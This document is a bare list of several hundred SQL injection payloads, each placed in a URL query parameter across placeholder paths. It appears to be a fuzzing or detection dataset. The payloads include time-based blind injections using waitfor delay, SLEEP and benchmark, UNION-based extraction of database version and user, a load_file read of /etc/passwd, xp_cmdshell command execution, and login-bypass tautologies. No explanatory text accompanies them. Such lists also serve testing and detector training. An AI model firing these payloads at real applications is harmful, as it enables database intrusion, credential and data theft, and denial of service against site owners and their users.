 /?payload=",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/path3/?payload=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload="),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload="),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/path3/?payload=waitfor delay '0:0:20' /* 
-
 /path0/path1/?payload= waitfor delay '0:0:20' --
-
 /?payload=' waitfor delay '0:0:20' /* 
-
 /?payload=' waitfor delay '0:0:20' --
-
 /?payload=" waitfor delay '0:0:20' /* 
-
 /?payload=" waitfor delay '0:0:20' --
-
 /path0/path1/?payload=) waitfor delay '0:0:20' /* 
-
 /path0/path1/path2/path3/?payload=) waitfor delay '0:0:20' --
-
 /path0/path1/?payload=)) waitfor delay '0:0:20' /* 
-
 /path0/?payload=)) waitfor delay '0:0:20' --
-
 /path0/path1/path2/?payload=))) waitfor delay '0:0:20' /* 
-
 /path0/path1/path2/?payload=))) waitfor delay '0:0:20' --
-
 /?payload=)))) waitfor delay '0:0:20' /* 
-
 /path0/path1/?payload=)))) waitfor delay '0:0:20' --
-
 /path0/?payload=))))) waitfor delay '0:0:20' --
-
 /path0/path1/?payload=)))))) waitfor delay '0:0:20' --
-
 /?payload=') waitfor delay '0:0:20' /* 
-
 /path0/path1/?payload=') waitfor delay '0:0:20' --
-
 /path0/path1/path2/path3/?payload=") waitfor delay '0:0:20' /* 
-
 /path0/path1/path2/?payload=") waitfor delay '0:0:20' --
-
 /path0/?payload=')) waitfor delay '0:0:20' /* 
-
 /?payload=')) waitfor delay '0:0:20' --
-
 /?payload=")) waitfor delay '0:0:20' /* 
-
 /path0/path1/?payload=")) waitfor delay '0:0:20' --
-
 /path0/path1/path2/path3/?payload='))) waitfor delay '0:0:20' /* 
-
 /path0/path1/path2/path3/?payload='))) waitfor delay '0:0:20' --
-
 /path0/path1/?payload="))) waitfor delay '0:0:20' /* 
-
 /path0/path1/path2/?payload="))) waitfor delay '0:0:20' --
-
 /path0/path1/path2/path3/?payload=')))) waitfor delay '0:0:20' /* 
-
 /path0/path1/?payload=')))) waitfor delay '0:0:20' --
-
 /?payload=")))) waitfor delay '0:0:20' /* 
-
 /path0/path1/path2/?payload=")))) waitfor delay '0:0:20' --
-
 /path0/path1/?payload='))))) waitfor delay '0:0:20' /* 
-
 /path0/path1/path2/path3/?payload='))))) waitfor delay '0:0:20' --
-
 /path0/path1/path2/?payload="))))) waitfor delay '0:0:20' /* 
-
 /?payload="))))) waitfor delay '0:0:20' --
-
 /?payload=')))))) waitfor delay '0:0:20' /* 
-
 /?payload=')))))) waitfor delay '0:0:20' --
-
 /path0/?payload=")))))) waitfor delay '0:0:20' /* 
-
 /?payload=")))))) waitfor delay '0:0:20' --
-
 /path0/path1/path2/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
-
 /path0/path1/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
-
 /path0/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
-
 /path0/path1/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
-
 /path0/path1/path2/path3/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
-
 /path0/path1/path2/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
-
 /path0/path1/path2/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
-
 /path0/path1/path2/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
-
 /?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
-
 /path0/path1/path2/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
-
 /path0/path1/path2/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
-
 /?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
-
 /path0/path1/path2/path3/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
-
 /path0/path1/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
-
 /path0/path1/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
-
 /path0/path1/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
-
 /path0/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
-
 /path0/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
-
 /path0/path1/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
-
 /path0/path1/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
-
 /?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
-
 /path0/path1/path2/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
-
 /path0/path1/path2/path3/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
-
 /path0/path1/path2/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
-
 /path0/path1/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
-
 /path0/path1/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
-
 /path0/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
-
 /?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/path3/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
-
 /path0/path1/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
-
 /path0/path1/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/path3/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/path3/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
-
 /path0/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
-
 /?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
-
 /?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
-
 /path0/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/path2/path3/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
-
 /?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
-
 /?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/path3/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/path2/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/path2/path3/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/path3/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/path1/path2/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/?payload=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /path0/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/path1/path2/?payload='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /path0/path1/path2/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
-
 /?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
-
 /path0/?payload="+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
-
 /?payload=,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
-
 /?payload=,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
-
 /path0/path1/path2/path3/?payload=,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
-
 /?payload=',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
-
 /path0/path1/path2/?payload=',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
-
 /path0/?payload=',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
-
 /?payload=",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
-
 /path0/path1/path2/path3/?payload=",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
-
 /path0/path1/?payload=",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
-
 /path0/?payload=),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
-
 /path0/path1/path2/?payload=),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
-
 /path0/path1/path2/path3/?payload=),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
-
 /path0/?payload='),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
-
 /path0/path1/path2/?payload='),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
-
 /path0/path1/path2/path3/?payload='),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
-
 /path0/path1/path2/?payload="),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
-
 /path0/?payload="),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
-
 /path0/path1/path2/path3/?payload="),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
-
 /path0/?payload=\x27\x4F\x52 SELECT *
-
 /path0/path1/?payload=\x27\x6F\x72 SELECT *
-
 /path0/?payload='or select *
-
 /path0/path1/path2/?payload=admin'--
-
 /path0/path1/path2/path3/?payload=' or 'x'='x
-
 /?payload=" or "x"="x
-
 /path0/path1/path2/path3/?payload=') or ('x'='x
-
 /?payload=0 or 1=1
-
 /path0/?payload=' or 0=0 --
-
 /path0/path1/path2/path3/?payload=" or 0=0 --
-
 /path0/?payload=or 0=0 --
-
 /path0/path1/path2/path3/?payload=' or 0=0 #
-
 /path0/?payload=" or 0=0 #
-
 /path0/path1/path2/?payload=or 0=0 #
-
 /?payload=' or 1=1--
-
 /path0/?payload=" or 1=1--
-
 /?payload=' or '1'='1'--
-
 /path0/?payload="' or 1 --'"
-
 /path0/path1/?payload=or 1=1--
-
 /?payload=or%201=1
-
 /?payload=or%201=1 --
-
 /path0/path1/path2/?payload=' or 1=1 or ''='
-
 /?payload=" or 1=1 or ""="
-
 /path0/path1/path2/path3/?payload=' or a=a--
-
 /path0/?payload=" or "a"="a
-
 /path0/?payload=') or ('a'='a
-
 /path0/path1/path2/?payload=") or ("a"="a
-
 /path0/path1/path2/path3/?payload=hi" or "a"="a
-
 /path0/path1/?payload=hi" or 1=1 --
-
 /path0/path1/path2/?payload=hi' or 1=1 --
-
 /path0/path1/?payload=hi' or 'a'='a
-
 /path0/path1/path2/path3/?payload=hi') or ('a'='a
-
 /?payload=hi") or ("a"="a
-
 /path0/path1/path2/?payload='hi' or 'x'='x';
-
 /path0/path1/?payload=order by
-
 /path0/path1/path2/?payload=t'exec master..xp_cmdshell 'nslookup www.google.com'--
-
 /path0/?payload=\x27UNION SELECT
-
 /path0/?payload=' UNION SELECT
-
 /?payload=' UNION ALL SELECT
-
 /path0/path1/path2/path3/?payload=1;SELECT%20*
-
 /?payload='%20or%201=1
-
 /path0/?payload=%27%20or%201=1
-
 /?payload='--
-
 /?payload=1 or 1=1--
-
 /path0/path1/?payload=' or 1 in (@@version)--
-
 /path0/?payload=1 or 1 in (@@version)--
-
 /?payload='; waitfor delay '0:30:0'--
-
 /path0/?payload=1; waitfor delay '0:30:0'--
-
 /path0/path1/path2/?payload=benchmark(10000000,MD5(1))#
-
 /path0/path1/path2/?payload=";waitfor delay '0:0:__TIME__'--
-
 /path0/path1/path2/?payload="hi"") or (""a""=""a"
-
 /?payload= or 0=0 #
-
 /?payload=) or ('a'='a
-
 /?payload=1)) or benchmark(10000000,MD5(1))#
-
 /path0/path1/?payload="a"" or 3=3--"
-
 /path0/path1/?payload=" or benchmark(10000000,MD5(1))#
-
 /path0/path1/path2/path3/?payload= or 0=0 --
-
 /path0/?payload=1 waitfor delay '0:0:10'--
-
 /?payload= or 'a'='a
-
 /path0/path1/path2/path3/?payload=hi or 1=1 --"
-
 /path0/path1/?payload=or a = a
-
 /path0/?payload= UNION ALL SELECT
-
 /path0/path1/?payload=) or sleep(__TIME__)='
-
 /path0/path1/?payload=)) or benchmark(10000000,MD5(1))#
-
 /path0/path1/path2/?payload= or 1=1
-
 /?payload= or 2 > 1
-
 /?payload=")) or benchmark(10000000,MD5(1))#
-
 /path0/path1/path2/path3/?payload= or 3=3
-
 /?payload=));waitfor delay '0:0:__TIME__'--
-
 /path0/path1/?payload=a' waitfor delay '0:0:10'--
-
 /?payload=or 1=1
-
 /path0/path1/path2/?payload= and 1 in (select var from temp)--
-
 /path0/path1/path2/path3/?payload= or '7659'='7659
-
 /path0/path1/?payload= or 'text' = n'text'
-
 /path0/path1/path2/?payload= or 1=1 or ''='
-
 /path0/path1/?payload=; exec master..xp_cmdshell 'ping 172.10.1.255'--
-
 /path0/?payload= or 'unusual' = 'unusual'
-
 /path0/path1/path2/path3/?payload=1) or benchmark(10000000,MD5(1))#
-
 /path0/path1/?payload="));waitfor delay '0:0:__TIME__'--
-
 /path0/?payload=or a=a
-
 /path0/path1/?payload=) union select * from information_schema.tables;
-
 /path0/?payload= or 1=1--
-
 /?payload= and 1=( if((load_file(char(110,46,101,120,11 ...
-
 /**/or/**/1/**/=/**/1
-
 /path0/path1/path2/path3/?payload= union all select @@version--
-
 /path0/path1/path2/?payload=1 or benchmark(10000000,MD5(1))#
-
 /path0/path1/path2/path3/?payload=%20or%20''='
-
 /path0/?payload=hi' or 'x'='x';
-
 /path0/path1/path2/path3/?payload=") or sleep(__TIME__)="
-
 /path0/path1/?payload= union select 1,load_file('/etc/passwd'),1,1,1;
-
 /path0/?payload= union select
-
 /path0/?payload= select * from information_schema.tables--
-
 /path0/?payload=a' or 1=1--
-
 /path0/path1/path2/?payload=a' or 'a' = 'a
-
 /path0/path1/?payload= or 2 between 1 and 3
-
 /?payload= or a=a--
-
 /path0/path1/path2/path3/?payload= or '1'='1
-
 /path0/path1/?payload= or sleep(__TIME__)='
-
 /?payload= or 1 --'
-
 /path0/path1/path2/?payload=or 0=0 #"
-
 /path0/?payload=â or 1=1 --
-
 /?payload= having 1=1--
-
 /path0/path1/?payload=) or benchmark(10000000,MD5(1))#
-
 /?payload=;waitfor delay '0:0:__TIME__'--
-
 /path0/path1/?payload= or benchmark(10000000,MD5(1))#
-
 /path0/path1/?payload=");waitfor delay '0:0:__TIME__'--
-
 /?payload=a' or 3=3--
-
 /path0/path1/path2/path3/?payload= group by userid having 1=1--
-
 /path0/path1/path2/path3/?payload= or ''='
-
 /path0/path1/path2/path3/?payload=%20or%20x=x
-
 /path0/path1/path2/path3/?payload=")) or sleep(__TIME__)="
-
 /path0/path1/?payload=%20or%20'x'='x
-
 /?payload= or 'something' = 'some'+'thing'
-
 /path0/path1/?payload=Ã½ or 1=1 --
-
 /path0/?payload=) or (a=a
-
 /?payload=x' AND 1=(SELECT COUNT(*) FROM tabname); --
-
 /?payload=; or '1'='1'
-
 /path0/path1/path2/?payload=1 or 1=1
-
 /path0/path1/path2/path3/?payload=23 OR 1=1
-
 /path0/path1/path2/path3/?payload=anything' OR 'x'='x
-
 /path0/path1/path2/?payload= select name from syscolumns where id = (sele ...
-
 /?payload=hi or a=a
-
 /?payload=);waitfor delay '0:0:__TIME__'--
-
 /path0/path1/path2/?payload=") or benchmark(10000000,MD5(1))#
-
 /path0/path1/?payload= UNION SELECT
-
 /path0/path1/path2/?payload= or 1=1 /*
-
 /path0/?payload=)) or sleep(__TIME__)='
-
 /path0/path1/path2/?payload=or 1=1 or ""=
-
 /path0/?payload= or 1 in (select @@version)--
-
 /path0/path1/path2/?payload= union select * from users where login = char ...
-
 /path0/path1/path2/?payload=â or 3=3 --
-
 /path0/path1/path2/path3/?payload= or '1'='1'--
-
 /path0/path1/path2/path3/?payload="a"" or 1=1--"
-
 /path0/?payload= or 1/*
-
 /path0/path1/path2/?payload= or a = a
-
 /path0/path1/path2/path3/?payload=' or 1=1
-
 /path0/path1/?payload= or 1=1 --
-
 /path0/path1/path2/?payload='; exec master..xp_cmdshell 'ping 172.10.1.255'--
-
 /?payload='%20or%20''='
-
 /path0/?payload='%20or%20'x'='x
-
 /path0/path1/path2/path3/?payload=')%20or%20('x'='x
-
 /path0/path1/path2/?payload= or 0=0 #"
-
 /path0/path1/path2/path3/?payload=' or 1 --'
-
 /path0/path1/path2/path3/?payload= or 1=1 or ""=
-
 /path0/?payload= or a=a
-
 /path0/path1/?payload=' or 3=3
-
 /path0/path1/path2/?payload=select user from sysibm.sysdummy1;
-
 /path0/path1/path2/path3/?payload=select session_user from sysibm.sysdummy1;
-
 /path0/?payload=select system_user from sysibm.sysdummy1;
-
 /path0/path1/path2/?payload=select name from sysibm.systables;
-
 /?payload=select * from syscat.tabauth;
-
 /?payload=select * from syscat.tabauth where grantee = current user;
-
 /?payload=SELECT schemaname FROM syscat.schemata;
-
 /path0/path1/path2/?payload=a' or 1=1-- 
-
 /path0/path1/?payload='aNd 1=1
-
 /path0/path1/path2/path3/?payload=' anD 1=1"
-
 /path0/path1/path2/path3/?payload=' and 1=(select 1)+'
-
 /path0/path1/?payload=' OR 'sp'='sp
-
 /path0/path1/path2/?payload=superbug' AND 'a'='a
-
 /path0/?payload=' or''='
-
 /path0/path1/path2/?payload=superbug 'or''='
-
 /path0/path1/path2/?payload=' and 1=1
-
 /path0/path1/path2/path3/?payload=' and 1=1 'a'='a
-
 /path0/path1/path2/?payload=' aNd 1=2
-
 /path0/path1/path2/path3/?payload=' aNd 1=MID((database()),1,1)>1
-
 /path0/path1/?payload=' aNd 2=MID((@@version,1,1)--+
-
 /path0/path1/?payload=' aNd 3=MID((@@version,1,1)--+
-
 /?payload=' aNd 4=MID((@@version,1,1)--+
-
 /path0/path1/?payload=' aNd 5=MID((@@version,1,1)--+
-
 /path0/path1/path2/?payload=' or 1=1 --
-
 /path0/path1/path2/path3/?payload=a' or 1=1 --
-
 /?payload=' or 1=1#
-
 /path0/path1/?payload=or 1=1 --
-
 /?payload=' HAVING 1=1--
-
 /path0/?payload=' and+1=convert(int,@@version)
-
 /?payload=' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--"
-
 /path0/?payload=') or ('1'='1--
-
 /path0/path1/path2/path3/?payload=' GROUP BY 99999
-
 /path0/path1/path2/?payload=and+if(true%21=true,1,SLEEP(5))--+
-
 /?payload=and+if(1=2,1,SLEEP(5))--+
-
 /path0/path1/path2/?payload=and+true=false--+
-
 /path0/path1/?payload=and+false%21=false--+
-
 /path0/path1/?payload=and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+
-
 /path0/path1/path2/path3/?payload=union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+
-
 /path0/path1/?payload=' and+if(true%21=true,1,SLEEP(5))--+
-
 /path0/path1/path2/path3/?payload=' and+if(1=2,1,SLEEP(5))--+
-
 /path0/path1/path2/path3/?payload=' and+true=false--+
-
 /path0/path1/path2/?payload=' and+false%21=false--+
-
 /path0/path1/?payload=' and(select+1+from(select+count(*),floor(rand(0)*2)from+information_schema.tables+group+by+2)a)--+
-
 /path0/?payload=' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+
-
 /path0/?payload=WAITFOR DELAY '0:0:50';--"
-
 /path0/?payload='+(SELECT 1 FROM (SELECT SLEEP(50))A)+'
-
 /path0/?payload=(SELECT 1 FROM (SELECT SLEEP(50))A)
-
 /path0/path1/path2/?payload=1') AND SLEEP(50) AND ('LoUL'='LoUL"
-
 /path0/path1/path2/path3/?payload=' WAITFOR DELAY '0:0:50' and 'a'='a;--
-
 /path0/path1/?payload=' and  sleep(50) and  'a'='a
-
 /path0/path1/path2/?payload=' WAITFOR DELAY '0:0:50';--"
-
 /path0/path1/path2/path3/?payload=' WAITFOR DELAY '0:0:50';--
-
 /path0/path1/path2/path3/?payload=and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--
-
 /?payload=' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--
-
 /path0/path1/path2/path3/?payload=AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--
-
 /path0/path1/path2/path3/?payload=1,'0');waitfor delay '0:0:50;--
-
 /?payload=');waitfor delay'0:0:50';--
-
 /path0/path1/path2/path3/?payload=);waitfor delay '0:0:50';--
-
 /path0/path1/path2/?payload=‘ or 1=1 -- 
-
 /path0/path1/path2/?payload=x' AND 1=(SELECT COUNT(*) FROM tabname); -- 
-
 /path0/?payload='; exec master..xp_cmdshell 'ping 172.10.1.255'-- 
-
 /path0/?payload=' or 0=0 -- 
-
 /path0/path1/path2/?payload=" or 0=0 -- 
-
 /path0/?payload=or 0=0 -- 
-
 /path0/path1/path2/path3/?payload=' OR 1=1 LIMIT 1 #
-
 /?payload=' or 1=1-- 
-
 /path0/?payload=" or 1=1-- 
-
 /path0/path1/?payload=' or '1'='1'-- 
-
 /path0/path1/path2/?payload=' or 1=1 --'
-
 /path0/path1/?payload=or 1=1-- 
-
 /?payload=or%201=1 -- 
-
 /?payload=' or a=a-- 
-
 /path0/path1/path2/?payload=hi' or 1=1 -- 
-
 /path0/path1/?payload=t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
-
 /path0/path1/path2/path3/?payload=a' or 3=3-- 
-
 /path0/path1/path2/?payload=‘ or 3=3 -- 
-
